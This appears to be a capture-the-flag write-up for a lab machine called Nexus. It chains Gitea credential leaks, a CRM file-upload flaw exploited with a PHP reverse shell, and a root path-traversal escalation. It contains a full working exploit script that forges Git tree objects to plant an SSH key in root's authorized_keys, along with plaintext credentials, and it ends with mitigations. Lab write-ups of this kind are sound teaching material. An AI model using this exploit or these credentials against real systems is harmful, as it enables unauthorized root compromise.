## Executive Summary

Nexus is a easy-difficulty Linux machine that hosts a clinical energy organization portal and several internal subdomains. The attack path begins with virtual host fuzzing to discover Gitea (`git.nexus.htb`) and a Krayin CRM instance (`billing.nexus.htb`). A repository commit history leak on Gitea exposes an administrative password database setup credential. Using this credential along with a leaked email address, authenticated access is gained to the Krayin CRM instance. 

The CRM application is vulnerable to CVE-2026-38526, an authenticated arbitrary file upload flaw in the TinyMCE email attachment feature. This vulnerability is exploited by uploading a PHP reverse shell, obtaining initial code execution on the system as the `www-data` user. 

Post-exploitation enumeration reveals database configurations containing credentials that are successfully reused to pivot to the local user `jones` via SSH. Privilege escalation is achieved by exploiting a systemd timer running a custom Python script, template-sync.py, as root. This script suffers from a path traversal vulnerability during the extraction of Gitea template repositories. By forging a raw Git tree object containing path traversal sequences, an attacker can write arbitrary files anywhere on the filesystem as root. This is exploited to write an SSH key to root's configuration directory, achieving full administrative compromise.

The dashboard identifies the application version as Krayin CRM v2.2.0. This version is vulnerable to [CVE-2026-38526](https://socradar.io/blog/cve-2026-38526-krayin-crm-rce/), an authenticated arbitrary file upload vulnerability. This vulnerability resides in the `/admin/tinymce/upload` endpoint of Webkul Krayin CRM v2.2.x, which allows attackers to execute arbitrary code by uploading a crafted PHP file. The email compose feature uses the TinyMCE rich text editor, which routes its file uploads and attachments directly to this specific endpoint. Due to missing extension filtering and directory permissions configuration, any uploaded file is placed into a web-accessible storage path and remains executable.

An attacker can compose a new mail draft, attach a standard [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) PHP reverse shell payload, and trigger code execution by requesting the uploaded file.

### Python Sync Script Walkthrough

The timer executes `/etc/gitea/template-sync.py` which performs the following operations.

First, the script initializes the directory and path configuration constants:
```python
GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"
```

The script's logic runs as follows:
1. **Token Retrieval:** The `get_token()` function calls `load_config()` to parse either `/etc/gitea/template-sync.conf` or `/opt/forge/app/.env` and extract the admin Gitea API token (`GITEA_API_TOKEN`).
2. **Template Discovery:** The `get_template_repos()` function queries Gitea's API search endpoint `http://localhost:3000/api/v1/repos/search` to retrieve all repositories that are marked as templates (`template: true`).
3. **Repository Resolution:** For each template repository returned, `sync_template()` calculates its bare repository path on disk under `REPO_ROOT` and its target staging directory under `STAGING_DIR`:
   ```python
   def sync_template(repo_info):
       owner = repo_info['owner']['login']
       name = repo_info['name'].lower()
       bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
       stage_path = os.path.join(STAGING_DIR, owner, name)
   ```
4. **File Listing:** The script queries the repository file structure by executing the git plumbing command `git ls-tree -r HEAD` directly in the bare repository directory, extracting the mode, object hash, and tracked path (`filepath`) of every blob:
   ```python
       for mode, objhash, filepath in entries:
           target = os.path.join(stage_path, filepath)
           target_dir = os.path.dirname(target)
   ```
5. **Extraction:** It extracts the contents of each file using `git cat-file blob <objhash>` and writes the raw bytes directly to the resolved target path:
   ```python
           try:
               os.makedirs(target_dir, exist_ok=True)
               # ...
               with open(target, 'wb') as f:
                   f.write(cat_result.stdout)
   ```

### Path Traversal Vulnerability Analysis

The vulnerability is an **arbitrary file write via path traversal**:
1. The script retrieves the variable `filepath` directly from the output of the git plumbing command `git ls-tree -r HEAD` and trusts it blindly.
2. The script applies zero sanitization or filtering to the `filepath` string prior to joining it with `stage_path` using `os.path.join()`.
3. In Python, if one of the components passed to `os.path.join()` is an absolute path or contains directory traversal sequences like `../../../../`, the function will resolve relative paths accordingly and escape the prefix directory constraint.
4. Because the synchronization process runs under the privileges of the `root` user, writing to the resolved `target` path allows an attacker to overwrite or create any file on the host filesystem (e.g. root's SSH files or cron jobs).

### Git Object Manipulation Mechanics

Normally, high-level Git porcelain commands (like `git add` and `git commit`) validate file paths and reject files containing path traversal sequences or special directory names like `..`.

However, Git's low-level plumbing commands (such as `git hash-object`, `git mktree`, and `git commit-tree`) operate directly on the raw database and bypass these path validation rules. The Git object store handles file structures using three main object types:
- **Blobs:** Contain the raw file contents (independent of file names).
- **Trees:** Contain folder structures, mapping file names and modes to blob or sub-tree hashes.
- **Commits:** Point to a root tree object alongside commit author metadata.

Because Git's plumbing commands trust the object database implicitly and do not validate path entries, we can manually construct a tree object containing a filename containing path traversal sequences:
`100644 ../../../../../root/.ssh/authorized_keys\x00<blob_hash>`

When we commit and push this custom object to a Gitea repository and flag it as a template, the synchronization script executes `git ls-tree -r HEAD`, parses the malicious traversal path verbatim as `filepath`, resolves it via `os.path.join`, and extracts the blob contents directly into `/root/.ssh/authorized_keys`.

#### 3. Execute Exploit Script

The exploitation script creates a local bare Git repository, manually generates a blob with the SSH public key, constructs a custom tree object with a traversal path pointing to root's SSH directory, builds a commit, pushes the branch to Gitea under the `jones` account, and marks the repository as a Gitea template.

Configure the `ATTACKER_PUB` value in `pwn.py` and execute the script:

```python
#!/usr/bin/env python3
import hashlib
import zlib
import os
import time
import subprocess
import urllib.request
import shutil
import json
import base64

# ============ CONFIG ============
ATTACKER_PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK8ofeAgDLH2ut3Err/anUZTeY4zAC70Zl87IxFpwmHu root@nexus"
GITEA_USER = "jones"
GITEA_PASS = "y27xb3ha!!74GbR"
REPO_NAME = "evil-template"
GITEA_URL = "http://git.nexus.htb"
REPO_DIR = "/tmp/evil-template"
# ================================

def write_object(obj_type, data_bytes):
    """Write a raw git object and return its hash."""
    header = (obj_type + " " + str(len(data_bytes))).encode() + b"\x00"
    full = header + data_bytes
    h = hashlib.sha1(full).hexdigest()
    path = os.path.join(REPO_DIR, ".git", "objects", h[:2], h[2:])
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(zlib.compress(full))
    return h

def api_request(method, endpoint, data=None):
    """Make an authenticated API request to Gitea."""
    url = f"{GITEA_URL}/api/v1{endpoint}"
    req = urllib.request.Request(url, method=method)
    creds = base64.b64encode(f"{GITEA_USER}:{GITEA_PASS}".encode()).decode()
    req.add_header("Authorization", f"Basic {creds}")
    if data:
        req.add_header("Content-Type", "application/json")
        req.data = json.dumps(data).encode()
    try:
        with urllib.request.urlopen(req) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        print(f"API error {e.code}: {e.read().decode()}")
        return None

# Clean up and init bare repo
if os.path.exists(REPO_DIR):
    shutil.rmtree(REPO_DIR)
os.makedirs(REPO_DIR)
os.chdir(REPO_DIR)
subprocess.run(["git", "init", "--bare"], check=True)

# 1. Create blob object
blob_data = ATTACKER_PUB.encode()
blob_hash = write_object("blob", blob_data)
print(f"[+] Blob: {blob_hash}")

# 2. Create tree object with traversal path
tree_entry = b"100644 ../../../../../root/.ssh/authorized_keys\x00" + bytes.fromhex(blob_hash)
tree_hash = write_object("tree", tree_entry)
print(f"[+] Tree: {tree_hash}")

# 3. Create commit object
ts = int(time.time())
commit_body = (
    f"tree {tree_hash}\n"
    f"author root <root@nexus> {ts} +0000\n"
    f"committer root <root@nexus> {ts} +0000\n\n"
    "pwn\n"
).encode()
commit_hash = write_object("commit", commit_body)
print(f"[+] Commit: {commit_hash}")

# 4. Update ref AND HEAD
ref_path = os.path.join(REPO_DIR, ".git", "refs", "heads", "master")
os.makedirs(os.path.dirname(ref_path), exist_ok=True)
with open(ref_path, "w") as f:
    f.write(commit_hash + "\n")

# Set HEAD so git recognizes the branch
with open(os.path.join(REPO_DIR, ".git", "HEAD"), "w") as f:
    f.write("ref: refs/heads/master\n")

print(f"[+] Ref and HEAD updated")

# 5. Create repo on Gitea if it doesn't exist
print("[*] Creating repo on Gitea...")
result = api_request("POST", "/user/repos", {"name": REPO_NAME, "private": False, "auto_init": False})
if result is None:
    result = api_request("GET", f"/repos/{GITEA_USER}/{REPO_NAME}")
    if result is None:
        print("[-] Failed to create or find repo")
        exit(1)
    print("[*] Repo already exists")

# 6. Push to Gitea
print("[*] Pushing...")
remote_url = f"http://{GITEA_USER}:{GITEA_PASS}@git.nexus.htb/{GITEA_USER}/{REPO_NAME}.git"
subprocess.run(["git", "remote", "add", "origin", remote_url], check=False)
subprocess.run(["git", "push", "origin", "master", "--force"], check=True)

# 7. Mark as template
print("[*] Marking as template...")
result = api_request("PATCH", f"/repos/{GITEA_USER}/{REPO_NAME}", {"template": True})
if result:
    print("[+] Template flag set!")
else:
    print("[-] Failed to set template flag")

print("[*] Done. Wait up to 60 seconds, then:")
print(f"    ssh -i /path/to/your/private_key root@nexus.htb")
```

## Vulnerability Chain Summary

The full compromise of Nexus proceeds as follows. Virtual host fuzzing exposes Gitea (`git.nexus.htb`) and a Krayin CRM instance (`billing.nexus.htb`). A credential leak within Gitea repository commit history yields a setup password, granting authenticated access to Krayin CRM using the email address `j.matthew@nexus.htb`. Exploiting CVE-2026-38526, an arbitrary file upload flaw in Krayin CRM's TinyMCE email attachment feature, allows the upload of a PHP reverse shell, granting command execution as the `www-data` user. Database configuration files leak a password that is reused to pivot to the local user `jones` via SSH. Escalation to root leverages a systemd timer running a custom Python template synchronization script, template-sync.py, as root. This script copies files from Gitea template repositories using `os.path.join` without sanitizing the filepath. By using low-level Git plumbing commands to manually construct a tree entry with path traversal sequences (`../../../../root/.ssh/authorized_keys`), the script is tricked into writing the attacker's public SSH key directly into root's configuration directory, granting administrative SSH access.

## Mitigations

- **Remediate Krayin CRM File Uploads (CVE-2026-38526):** Restrict file upload types allowed via the TinyMCE upload endpoint to an explicit whitelist of safe image formats. Additionally, configure the web server (Nginx/Apache) to disable PHP execution within public-facing storage directories (e.g. `/storage/`).
- **Remove Exposed Passwords and Rotate Credentials:** Remove git repositories containing hardcoded credentials from the Gitea instance and rotate all leaked password strings (`N27xh!!2ucY04` and `y27xb3ha!!74GbR`).
- **Secure the Template Sync Script:** Modify template-sync.py to sanitize file paths before invoking file system writes. Resolve the canonical absolute path of target destinations and verify that the destination resides entirely inside the designated staging directory, rejecting any path containing traversal elements or parent directory references.
- **Enforce Least Privilege for Cron and Systemd Services:** Avoid running maintenance or synchronization utility scripts directly as root. If system files must be written, run the service under a dedicated, low-privilege service account and use polkit or structured capabilities to perform restricted writes.
